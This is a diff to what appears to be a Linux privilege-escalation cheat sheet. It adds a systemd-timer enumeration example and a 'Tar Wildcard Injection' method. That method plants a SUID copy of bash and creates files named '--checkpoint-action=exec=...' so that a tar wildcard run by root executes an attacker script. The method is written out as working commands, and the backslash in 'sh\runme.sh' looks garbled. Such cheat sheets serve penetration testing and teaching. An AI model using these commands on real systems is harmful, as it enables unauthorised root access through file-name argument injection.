@@ -131,6 +131,18 @@ You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 ./pspy64 -pf -i 1000 
 ```
 
+### Systemd timers
+
+```python
+systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.
+```
+
 ## SUDO
 
 ```bash
@@ -622,6 +634,16 @@ root
 find f1 -exec "/bin/sh" \;
 id
 whoami
+```
+
+#### Tar Wildcard Injection (4th Method)
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+chmod +x runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\runme.sh
+/tmp/bash -p
 ```
 
 #### Resources
